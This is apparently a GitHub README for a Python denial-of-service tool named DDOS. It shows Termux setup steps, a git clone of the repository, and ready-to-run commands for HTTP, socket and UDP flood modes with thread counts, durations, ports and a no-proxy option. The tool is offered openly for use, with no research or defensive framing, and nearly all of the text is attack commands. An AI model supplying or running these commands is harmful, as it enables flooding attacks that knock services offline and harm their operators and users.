# DDOS


<img width="1610" height="512" alt="Image" src="https://github.com/user-attachments/assets/88df4bdb-e4ce-42a7-af72-ec5c1bcfc367" />



EXAMPLE 

```bash
termux-setup-storage
apt update 

apt upgrade -y
pkg install git -y
pkg install python -y
pip install requests 
pip install colorama 

git clone https://github.com/anonmoty/DDOS.git
cd DDOS

ls

```

Run:

HTTP Flood

```bash
python3 DDOS.py -u http://your-server.com -t 4000 -d 60
```

Socket Flood:

```bash
python3 DDOS.py -u http://your-server.com -t 100 -d 60 -m socket --port 80
```

UDP Flood:

```bash
python3 DDOS.py -u http://your-server.com -t 100 -d 60 -m udp --port 53
```

Without proxies:

```bash
python3 DDOS.py -u http://your-server.com -t 500 -d 120 --no-proxy
```











<img width="720" height="1612" alt="Image" src="https://github.com/user-attachments/assets/c723bfdf-9cf1-4968-a717-c2c948dbb131" />
